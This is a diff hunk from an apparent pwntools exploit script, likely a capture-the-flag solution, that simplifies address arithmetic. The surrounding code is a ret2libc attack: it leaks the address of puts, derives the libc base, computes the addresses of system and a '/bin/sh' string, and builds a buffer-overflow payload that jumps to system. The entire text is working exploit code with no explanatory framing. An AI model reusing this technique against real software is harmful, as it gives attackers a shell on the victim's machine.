@@ -49,9 +49,9 @@ success("leaked_puts: %#x", leaked_puts) #hexadecimal
 libc_base  = leaked_puts - libc_puts
 success("libc_base: %#x", libc_base)
 p.recv()
-system = int(hex(libc_base + 0x0003a940),16)
-binsh = int(hex(libc_base + 0x15902b),16)
-skeleton = int(hex(libc_base + 0x158b15),16)
+system = libc_base + 0x0003a940
+binsh = libc_base + 0x15902b
+skeleton = libc_base + 0x158b15
  
 payload2 = cyclic(104)
 payload2 += p32(system)
